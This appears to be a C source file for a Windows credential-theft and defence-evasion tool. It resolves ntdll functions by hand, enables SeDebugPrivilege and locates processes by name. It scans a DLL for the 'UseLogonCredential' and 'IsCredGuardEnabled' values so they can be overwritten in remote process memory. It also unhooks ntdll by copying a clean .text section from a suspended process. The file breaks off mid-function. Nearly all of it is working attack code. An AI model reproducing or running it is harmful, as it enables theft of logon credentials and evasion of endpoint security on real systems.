#include <stdio.h>
#include <stdint.h>
#include <windows.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define OBJ_CASE_INSENSITIVE 0x00000040
#define FILE_OPEN 0x00000001
#define PS_ATTRIBUTE_IMAGE_NAME 0x20005

typedef enum   _PROCESSINFOCLASS { ProcessBasicInformation = 0 } PROCESSINFOCLASS;
typedef enum   _PS_CREATE_STATE { PsCreateInitialState, PsCreateFailOnFileOpen, PsCreateFailOnSectionCreate, PsCreateFailExeFormat, PsCreateFailMachineMismatch, PsCreateFailExeName, PsCreateSuccess, PsCreateMaximumStates } PS_CREATE_STATE;
typedef struct { BYTE data[16]; } LargePointer;
typedef struct _TOKEN_PRIVILEGES_STRUCT { DWORD PrivilegeCount; LUID Luid; DWORD Attributes; } TOKEN_PRIVILEGES_STRUCT, * PTOKEN_PRIVILEGES_STRUCT;
typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information; } IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
typedef struct _RTL_DRIVE_LETTER_CURDIR { USHORT Flags, Length; ULONG TimeStamp; UNICODE_STRING DosPath; } RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;
typedef struct _RTL_USER_PROCESS_PARAMETERS { ULONG MaximumLength, Length, Flags, DebugFlags; HANDLE ConsoleHandle, StandardInput, StandardOutput, StandardError, CurrentDirectoryHandle; ULONG ConsoleFlags, StartingX, StartingY, CountX, CountY, CountCharsX, CountCharsY, FillAttribute, WindowFlags, ShowWindowFlags, EnvironmentSize; UNICODE_STRING CurrentDirectoryPath, DllPath, ImagePathName, CommandLine, WindowTitle, DesktopInfo, ShellInfo, RuntimeData; PVOID Environment; RTL_DRIVE_LETTER_CURDIR CurrentDirectories[32]; } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
typedef struct _PS_ATTRIBUTE { ULONG_PTR Attribute; SIZE_T Size; union { ULONG_PTR Value; PVOID ValuePtr; }; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE;
typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[2]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
typedef struct _PS_CREATE_INFO { SIZE_T Size; PS_CREATE_STATE State; union { struct { union { ULONG InitFlags; struct { UCHAR WriteOutputOnExit : 1, DetectManifest : 1, IFEOSkipDebugger : 1, IFEODoNotPropagateKeyState : 1, SpareBits1 : 4, SpareBits2 : 8; USHORT ProhibitedImageCharacteristics : 16; } s1; } u1; ACCESS_MASK AdditionalFileAccess; } InitState; struct { HANDLE FileHandle; } FailSection; struct { USHORT DllCharacteristics; } ExeFormat; struct { HANDLE IFEOKey; } ExeName; struct { union { ULONG OutputFlags; struct { UCHAR ProtectedProcess : 1, AddressSpaceOverride : 1, DevOverrideEnabled : 1, ManifestDetected : 1, ProtectedProcessLight : 1, SpareBits1 : 3, SpareBits2 : 8; USHORT SpareBits3 : 16; } s2; } u2; HANDLE FileHandle, SectionHandle; ULONGLONG UserProcessParametersNative; ULONG UserProcessParametersWow64, CurrentParameterFlags; ULONGLONG PebAddressNative; ULONG PebAddressWow64; ULONGLONG ManifestAddress; ULONG ManifestSize; } SuccessState; }; } PS_CREATE_INFO, * PPS_CREATE_INFO;

typedef NTSTATUS(WINAPI* NtOpenProcessTokenFn)(HANDLE, DWORD, PHANDLE);
typedef NTSTATUS(WINAPI* NtAdjustPrivilegesTokenFn)(HANDLE, BOOL, PTOKEN_PRIVILEGES_STRUCT, DWORD, PVOID, PVOID);
typedef NTSTATUS(WINAPI* NtGetNextProcessFn)(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
typedef NTSTATUS(WINAPI* NtQueryInformationProcessFn)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE);
typedef NTSTATUS(WINAPI* NtCreateFileFn)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
typedef NTSTATUS(WINAPI* NtReadFileFn)(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
typedef NTSTATUS(WINAPI* NtWriteVirtualMemoryFn)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesWritten);
typedef NTSTATUS(WINAPI* NtTerminateProcessFn)(HANDLE ProcessHandle, int ExitStatus);
typedef NTSTATUS(WINAPI* NtProtectVirtualMemoryFn)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
typedef NTSTATUS(WINAPI* NtCreateUserProcessFn)(PHANDLE ProcessHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes, POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags, PRTL_USER_PROCESS_PARAMETERS ProcessParameters, PPS_CREATE_INFO CreateInfo, PPS_ATTRIBUTE_LIST AttributeList);
typedef NTSTATUS(WINAPI* RtlCreateProcessParametersExFn)(PRTL_USER_PROCESS_PARAMETERS* pProcessParameters, PUNICODE_STRING ImagePathName, PUNICODE_STRING DllPath, PUNICODE_STRING CurrentDirectory, PUNICODE_STRING CommandLine, PVOID Environment, PUNICODE_STRING WindowTitle, PUNICODE_STRING DesktopInfo, PUNICODE_STRING ShellInfo, PUNICODE_STRING RuntimeData, ULONG Flags);
typedef NTSTATUS(WINAPI* RtlDestroyProcessParametersFn)(PRTL_USER_PROCESS_PARAMETERS ProcessParameters);
typedef PVOID   (WINAPI* RtlAllocateHeapFn)(PVOID HeapHandle, ULONG  Flags, SIZE_T Size);
typedef NTSTATUS(WINAPI* RtlFreeHeapFn)(PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
typedef NTSTATUS(WINAPI* RtlInitUnicodeStringFn)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

NtOpenProcessTokenFn NtOpenProcessToken;
NtAdjustPrivilegesTokenFn NtAdjustPrivilegesToken;
NtGetNextProcessFn NtGetNextProcess;
NtQueryInformationProcessFn NtQueryInformationProcess;
NtReadVirtualMemoryFn NtReadVirtualMemory;
NtCloseFn NtClose;
NtCreateFileFn NtCreateFile;
NtReadFileFn NtReadFile;
NtWriteVirtualMemoryFn NtWriteVirtualMemory;
NtTerminateProcessFn NtTerminateProcess;
NtProtectVirtualMemoryFn NtProtectVirtualMemory;
NtCreateUserProcessFn NtCreateUserProcess;
RtlCreateProcessParametersExFn RtlCreateProcessParametersEx;
RtlDestroyProcessParametersFn RtlDestroyProcessParameters;
RtlAllocateHeapFn RtlAllocateHeap;
RtlFreeHeapFn RtlFreeHeap;
RtlInitUnicodeStringFn RtlInitUnicodeString;


// Get SeDebugPrivilege privilege
bool EnableDebugPrivileges() {
    HANDLE currentProcess = (HANDLE)-1;
    HANDLE tokenHandle = NULL;

    // Open the process token
    NTSTATUS ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tokenHandle);
    if (ntstatus != 0) {
        printf("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n", ntstatus);
        exit(-1);
    }

    // Set the privilege
    TOKEN_PRIVILEGES_STRUCT tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Luid.LowPart = 20; // LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid) would normally be used to get this value
    tokenPrivileges.Luid.HighPart = 0;
    tokenPrivileges.Attributes = 0x00000002;

    ntstatus = NtAdjustPrivilegesToken(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (ntstatus != 0) {
        printf("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X. Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue.\n", ntstatus);
        NtClose(tokenHandle);
        exit(-1);
    }

    // Close the handle
    if (tokenHandle != NULL) {
        NtClose(tokenHandle);
    }

    return true;
}


// Read remote IntPtr (8-bytes)
PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    BYTE buff[8];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
        return NULL;
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}


// Read remote 16-bytes address
uintptr_t ReadRemoteUintptr_t(HANDLE hProcess, PVOID mem_address) {
    BYTE buff[16];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(uintptr_t), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteUintptr_t). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
        return 0;
    }

    uintptr_t value = *(uintptr_t*)buff;
    return value;
}


// Read remote Unicode string
char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    BYTE buff[256];
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);

    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        printf("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x%X reading address 0x%p\n", ntstatus, mem_address);
    }

    static char unicode_str[128];
    int str_index = 0;

    for (int i = 0; i < sizeof(buff) - 1; i += 2) {
        if (buff[i] == 0 && buff[i + 1] == 0) {
            break;
        }
        wchar_t wch = *(wchar_t*)&buff[i];
        unicode_str[str_index++] = (char)wch;
    }
    unicode_str[str_index] = '\0';
    return unicode_str;
}


uintptr_t CustomGetModuleHandle(HANDLE hProcess, const char* dll_name) {
    int process_basic_information_size = 48;
    int peb_offset = 0x8;
    int ldr_offset = 0x18;
    int inInitializationOrderModuleList_offset = 0x30;
    int flink_dllbase_offset = 0x20;
    int flink_buffer_fulldllname_offset = 0x40;
    int flink_buffer_offset = 0x50;

    BYTE pbi_byte_array[48];
    void* pbi_addr = (void*)pbi_byte_array;
    ULONG ReturnLength;

    NTSTATUS ntstatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi_addr, process_basic_information_size, &ReturnLength);
    if (ntstatus != 0) {
        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    void* peb_pointer = (void*)((uintptr_t)pbi_addr + peb_offset);
    void* pebaddress = *(void**)peb_pointer;
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
    if ((long long)ldr_adress == 0) {
        printf("[-] PEB structure is not readable.\n");
        exit(0);
    }
    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

    uintptr_t dll_base = (uintptr_t)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);

        dll_base = (uintptr_t)ReadRemoteUintptr_t(hProcess, (void*)((uintptr_t)next_flink + flink_dllbase_offset));

        void* buffer = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(hProcess, buffer);

        if (strcmp(base_dll_name, dll_name) == 0) {
            return dll_base;
        }
        next_flink = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + 0x10));
    }

    return 0;
}


char* GetProcNameFromHandle(HANDLE process_handle) {
    const int process_basic_information_size = 48;
    const int peb_offset = 0x8;
    const int commandline_offset = 0x68;
    const int processparameters_offset = 0x20;

    unsigned char pbi_byte_array[process_basic_information_size];
    void* pbi_addr = NULL;
    pbi_addr = (void*)pbi_byte_array;

    // Query process information
    ULONG returnLength;
    NTSTATUS ntstatus = NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        printf("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return NULL;
    }

    // Get PEB Base Address
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;

    // Get PEB->ProcessParameters
    PVOID processparameters_pointer = (PVOID)((BYTE*)pebaddress + processparameters_offset);

    // Get ProcessParameters->CommandLine
    PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer);
    PVOID commandline_pointer = (PVOID)((BYTE*)processparameters_address + commandline_offset);
    PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
    char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);
    return commandline_value;
}


void to_lowercase(char* str) {
    while (*str) {
        *str = tolower((unsigned char)*str);  // Convert each character to lowercase
        str++;
    }
}


HANDLE GetProcessByName(const char* proc_name) {
    HANDLE aux_handle = NULL;
    while (NT_SUCCESS(NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle))) {
        char* current_proc_name = GetProcNameFromHandle(aux_handle);
        to_lowercase(current_proc_name);
        if (current_proc_name && strcmp(current_proc_name, proc_name) == 0) {
            return aux_handle;
        }
    }
    return NULL;
}


void* CustomGetProcAddress(void* pDosHdr, const char* func_name) {
    int exportrva_offset = 136;
    HANDLE hProcess = (HANDLE)-1;
    // DOS header (IMAGE_DOS_HEADER)->e_lfanew
    DWORD e_lfanew_value = 0;
    SIZE_T aux = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + 0x3C, &e_lfanew_value, sizeof(e_lfanew_value), &aux);
    // NT Header (IMAGE_NT_HEADERS)->FileHeader(IMAGE_FILE_HEADER)->SizeOfOptionalHeader
    WORD sizeopthdr_value = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + 20, &sizeopthdr_value, sizeof(sizeopthdr_value), &aux);
    // Optional Header(IMAGE_OPTIONAL_HEADER64)->DataDirectory(IMAGE_DATA_DIRECTORY)[0]->VirtualAddress
    DWORD exportTableRVA_value = 0;
    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + exportrva_offset, &exportTableRVA_value, sizeof(exportTableRVA_value), &aux);
    if (exportTableRVA_value != 0) {
        // Read NumberOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->NumberOfNames
        DWORD numberOfNames_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x18, &numberOfNames_value, sizeof(numberOfNames_value), &aux);
        // Read AddressOfFunctions: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfFunctions
        DWORD addressOfFunctionsVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x1C, &addressOfFunctionsVRA_value, sizeof(addressOfFunctionsVRA_value), &aux);
        // Read AddressOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNames
        DWORD addressOfNamesVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x20, &addressOfNamesVRA_value, sizeof(addressOfNamesVRA_value), &aux);
        // Read AddressOfNameOrdinals: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNameOrdinals
        DWORD addressOfNameOrdinalsVRA_value = 0;
        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x24, &addressOfNameOrdinalsVRA_value, sizeof(addressOfNameOrdinalsVRA_value), &aux);
        void* addressOfFunctionsRA = (BYTE*)pDosHdr + addressOfFunctionsVRA_value;
        void* addressOfNamesRA = (BYTE*)pDosHdr + addressOfNamesVRA_value;
        void* addressOfNameOrdinalsRA = (BYTE*)pDosHdr + addressOfNameOrdinalsVRA_value;
        for (int i = 0; i < (int)numberOfNames_value; i++) {
            DWORD functionAddressVRA = 0;
            NtReadVirtualMemory(hProcess, addressOfNamesRA, &functionAddressVRA, sizeof(functionAddressVRA), &aux);
            void* functionAddressRA = (BYTE*)pDosHdr + functionAddressVRA;
            char functionName[256];
            NtReadVirtualMemory(hProcess, functionAddressRA, functionName, strlen(func_name) + 1, &aux);
            if (strcmp(functionName, func_name) == 0) {
                WORD ordinal = 0;
                NtReadVirtualMemory(hProcess, addressOfNameOrdinalsRA, &ordinal, sizeof(ordinal), &aux);
                void* functionAddress;
                NtReadVirtualMemory(hProcess, (BYTE*)addressOfFunctionsRA + ordinal * 4, &functionAddress, sizeof(functionAddress), &aux);
                uintptr_t maskedFunctionAddress = (uintptr_t)functionAddress & 0xFFFFFFFF;
                return (BYTE*)pDosHdr + (DWORD_PTR)maskedFunctionAddress;
            }
            addressOfNamesRA = (BYTE*)addressOfNamesRA + 4;
            addressOfNameOrdinalsRA = (BYTE*)addressOfNameOrdinalsRA + 2;
        }
    }
    return NULL;
}


bool SetValue(HANDLE processHandle, LPVOID address, uint32_t value) {
    ULONG bytesWritten;
    NTSTATUS ntstatus;

    ntstatus = NtWriteVirtualMemory(
        processHandle,
        address,
        &value,
        sizeof(uint32_t),
        &bytesWritten
    );

    if (ntstatus != 0 || bytesWritten != sizeof(uint32_t)) {
        printf("Failed to write memory. Error code: %lu\n", GetLastError());
        return false;
    }

    return true;
}


bool ReadValues(HANDLE processHandle, void* address, BYTE* buffer, SIZE_T bufferLength) {
    SIZE_T bytesRead = 0;

    // Call NtReadVirtualMemory
    NTSTATUS ntstatus = NtReadVirtualMemory(processHandle, address, buffer, bufferLength, &bytesRead);

    // Check if the read was successful and all bytes were read
    if (ntstatus == 0 && bytesRead == bufferLength) {
        return true;
    }
    return false;
}


bool ParsePEFile(BYTE* buffer, size_t bufferSize, int* offset, int* useLogonCredential, int* isCredGuardEnabled, BYTE* matchedBytes) {
    *offset = 0;
    *useLogonCredential = 0;
    *isCredGuardEnabled = 0;
    memset(matchedBytes, 0, 18);

    // PE header location
    int peHeaderOffset = *(int32_t*)(buffer + 0x3C);
    uint32_t peSignature = *(uint32_t*)(buffer + peHeaderOffset);
    if (peSignature != 0x00004550) {
        printf("Not a valid PE file.\n");
        return false;
    }

    uint16_t numberOfSections = *(uint16_t*)(buffer + peHeaderOffset + 6);
    uint16_t sizeOfOptionalHeader = *(uint16_t*)(buffer + peHeaderOffset + 20);
    int sectionHeadersOffset = peHeaderOffset + 24 + sizeOfOptionalHeader;

    for (int i = 0; i < numberOfSections; i++) {
        int sectionOffset = sectionHeadersOffset + (i * 40); // Each section header is 40 bytes
        char sectionName[9];
        memcpy(sectionName, buffer + sectionOffset, 8);
        sectionName[8] = '\0'; // Null-terminate
        if (strcmp(sectionName, ".text") == 0) {
            uint32_t virtualAddress = *(uint32_t*)(buffer + sectionOffset + 12);
            uint32_t rawDataPointer = *(uint32_t*)(buffer + sectionOffset + 20);
            uint32_t rawDataSize = *(uint32_t*)(buffer + sectionOffset + 16);
            // Search for pattern
            for (uint32_t j = rawDataPointer; j < rawDataPointer + rawDataSize - 11; j++) {
                if (j + 11 >= bufferSize) break;
                if (buffer[j] == 0x39 && buffer[j + 5] == 0x00 &&
                    buffer[j + 6] == 0x8b && buffer[j + 11] == 0x00) {
                    *offset = j + virtualAddress - rawDataPointer;
                    int count = 0;
                    for (uint32_t k = j; k < j + 18 && k < bufferSize; k++) {
                        matchedBytes[count++] = buffer[k];
                    }
                    // Extract values
                    if (j + 5 < bufferSize) {
                        *useLogonCredential = (buffer[j + 4] << 16) | (buffer[j + 3] << 8) | buffer[j + 2];
                        *isCredGuardEnabled = (buffer[j + 10] << 16) | (buffer[j + 9] << 8) | buffer[j + 8];
                    }
                    return true;
                }
            }
            printf("Pattern not found.\n");
        }
    }
    return false;
}


BYTE* ReadDLL(HANDLE fileHandle) {
    BYTE* fileBytes = (BYTE*)malloc(1024 * 1024); // 1 MB
    if (!fileBytes) {
        fprintf(stderr, "Failed to allocate memory for fileBytes.\n");
        return NULL;
    }

    IO_STATUS_BLOCK ioStatusBlock = { 0 };
    LARGE_INTEGER byteOffset = { 0 };
    NTSTATUS status;

    // Call NtReadFile
    status = NtReadFile(
        fileHandle,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        fileBytes,
        1024 * 1024,
        &byteOffset,
        NULL
    );

    // Check status: 0x103 (STATUS_PENDING) is allowed
    if (status != 0 && status != 0x103) {
        fprintf(stderr, "Failed to read file. NTSTATUS: 0x%08X\n", status);
        free(fileBytes);
        return NULL;
    }

    return fileBytes; // Return the buffer
}


static bool OpenFile(const wchar_t* filePath, HANDLE* fileHandle) {
    // Initialize UNICODE_STRING
    UNICODE_STRING unicodeString;
    unicodeString.Length = (USHORT)(wcslen(filePath) * sizeof(wchar_t));
    unicodeString.MaximumLength = (USHORT)((wcslen(filePath) + 1) * sizeof(wchar_t));
    unicodeString.Buffer = (PWSTR)filePath;

    // Set up OBJECT_ATTRIBUTES
    OBJECT_ATTRIBUTES objectAttributes;
    objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    objectAttributes.RootDirectory = NULL;
    objectAttributes.ObjectName = &unicodeString;
    objectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
    objectAttributes.SecurityDescriptor = NULL;
    objectAttributes.SecurityQualityOfService = NULL;

    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status = NtCreateFile(
        fileHandle,
        FILE_READ_DATA | FILE_READ_ATTRIBUTES,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        0,
        FILE_SHARE_READ,
        FILE_OPEN,
        0,
        NULL,
        0
    );

    if (status != 0) {
        fprintf(stderr, "Failed to open file handle. NTSTATUS: 0x%08X\n", status);
        return false;
    }

    return true;
}


void initializeFunctions() {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress((HMODULE)hNtdll, "NtReadVirtualMemory");
    NtClose = (NtCloseFn)CustomGetProcAddress(hNtdll, "NtClose");
    NtOpenProcessToken = (NtOpenProcessTokenFn)CustomGetProcAddress(hNtdll, "NtOpenProcessToken");
    NtAdjustPrivilegesToken = (NtAdjustPrivilegesTokenFn)CustomGetProcAddress(hNtdll, "NtAdjustPrivilegesToken");
    NtGetNextProcess = (NtGetNextProcessFn)CustomGetProcAddress(hNtdll, "NtGetNextProcess");
    NtCreateFile = (NtCreateFileFn)CustomGetProcAddress(hNtdll, "NtCreateFile");
    NtReadFile = (NtReadFileFn)CustomGetProcAddress(hNtdll, "NtReadFile");
    NtWriteVirtualMemory = (NtWriteVirtualMemoryFn)CustomGetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NtTerminateProcess = (NtTerminateProcessFn)CustomGetProcAddress(hNtdll, "NtTerminateProcess");
    NtProtectVirtualMemory = (NtProtectVirtualMemoryFn)CustomGetProcAddress(hNtdll, "NtProtectVirtualMemory");
    NtCreateUserProcess = (NtCreateUserProcessFn)CustomGetProcAddress(hNtdll, "NtCreateUserProcess");
    RtlCreateProcessParametersEx = (RtlCreateProcessParametersExFn)CustomGetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
    RtlDestroyProcessParameters = (RtlDestroyProcessParametersFn)CustomGetProcAddress(hNtdll, "RtlDestroyProcessParameters");
    RtlAllocateHeap = (RtlAllocateHeapFn)CustomGetProcAddress(hNtdll, "RtlAllocateHeap");
    RtlFreeHeap = (RtlFreeHeapFn)CustomGetProcAddress(hNtdll, "RtlFreeHeap");
    RtlInitUnicodeString = (RtlInitUnicodeStringFn)CustomGetProcAddress(hNtdll, "RtlInitUnicodeString");
}


bool is64BitProcess() {
#ifdef _WIN64
    return true;
#else
    return false;
#endif
}


int* GetTextSectionInfo(LPVOID ntdll_address) {
    HANDLE hProcess = (HANDLE)-1;
    // Check MZ Signature (2 bytes)
    BYTE signature_dos_header[2];
    SIZE_T bytesRead;
    if ((NtReadVirtualMemory(hProcess, ntdll_address, signature_dos_header, 2, &bytesRead) != 0) || bytesRead != 2) {
        printf("[-] Error reading DOS header signature\n");
        ExitProcess(0);
    }

    if (signature_dos_header[0] != 'M' || signature_dos_header[1] != 'Z') {
        printf("[-] Incorrect DOS header signature\n");
        ExitProcess(0);
    }

    // Read e_lfanew (4 bytes) at offset 0x3C
    DWORD e_lfanew;
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + 0x3C, &e_lfanew, 4, &bytesRead) != 0) || bytesRead != 4) {
        printf("[-] Error reading e_lfanew\n");
        ExitProcess(0);
    }

    // Check PE Signature (2 bytes)
    BYTE signature_nt_header[2];
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + e_lfanew, signature_nt_header, 2, &bytesRead) != 0) || bytesRead != 2) {
        printf("[-] Error reading NT header signature\n");
        ExitProcess(0);
    }

    if (signature_nt_header[0] != 'P' || signature_nt_header[1] != 'E') {
        printf("[-] Incorrect NT header signature\n");
        ExitProcess(0);
    }

    // Check Optional Headers Magic field value (2 bytes)
    WORD optional_header_magic;
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24, &optional_header_magic, 2, &bytesRead) != 0) || bytesRead != 2) {
        printf("[-] Error reading Optional Header Magic\n");
        ExitProcess(0);
    }

    if (optional_header_magic != 0x20B && optional_header_magic != 0x10B) {
        printf("[-] Incorrect Optional Header Magic field value\n");
        ExitProcess(0);
    }

    // Read SizeOfCode (4 bytes)
    DWORD sizeofcode;
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 4, &sizeofcode, 4, &bytesRead) != 0) || bytesRead != 4) {
        printf("[-] Error reading SizeOfCode\n");
        ExitProcess(0);
    }

    // Read BaseOfCode (4 bytes)
    DWORD baseofcode;
    if ((NtReadVirtualMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 20, &baseofcode, 4, &bytesRead) != 0) || bytesRead != 4) {
        printf("[-] Error reading BaseOfCode\n");
        ExitProcess(0);
    }

    // Return BaseOfCode and SizeOfCode as an array
    static int result[2];
    result[0] = baseofcode;
    result[1] = sizeofcode;

    return result;
}


// Get ntdll from debug/suspended process 
LPVOID MapNtdllFromSuspendedProc(HANDLE hProcess) {
    HANDLE currentProcess = (HANDLE)(-1);
    uintptr_t localNtdllHandle = CustomGetModuleHandle(currentProcess, "ntdll.dll");
    int* result = GetTextSectionInfo((void*)localNtdllHandle);
    int localNtdllTxtBase = result[0];
    int localNtdllTxtSize = result[1];
    LPVOID localNtdllTxt = (LPVOID)((DWORD_PTR)localNtdllHandle + localNtdllTxtBase);
    BYTE* ntdllBuffer = (BYTE*)malloc(localNtdllTxtSize);
    SIZE_T bytesRead;
    NTSTATUS readprocmem_res = NtReadVirtualMemory(
        hProcess,
        localNtdllTxt,
        ntdllBuffer,
        localNtdllTxtSize,
        &bytesRead
    );
    if (readprocmem_res != 0) {
        printf("[-] Error calling NtReadVirtualMemory\n");
        exit(0);
    }
    LPVOID pNtdllBuffer = (LPVOID)ntdllBuffer;
    NTSTATUS terminateproc_res = NtTerminateProcess(hProcess, 0);
    if (terminateproc_res != 0) {
        printf("[-] Error calling DebugActiveProcessStop or TerminateProcess\n");
        exit(0);
    }
    NTSTATUS closehandle_proc = NtClose(hProcess);
    if (closehandle_proc != 0) {
        printf("[-] Error calling NtClose\n");
        exit(0);
    }
    return pNtdllBuffer;
}


// Overwrite hooked ntdll .text section with a clean version
void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {
    ULONG dwOldProtection;
    HANDLE currentProcess = (HANDLE)(-1);
    SIZE_T aux = localNtdllTxtSize;
    NTSTATUS vp_res = NtProtectVirtualMemory(currentProcess, &localNtdllTxt, &aux, 0x80, &dwOldProtection);
    if (vp_res != 0) {
        printf("[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY)\n");
        return;
    }

    //getchar();
    memcpy(localNtdllTxt, unhookedNtdllTxt, localNtdllTxtSize);

    // VirtualProtect back to the original protection
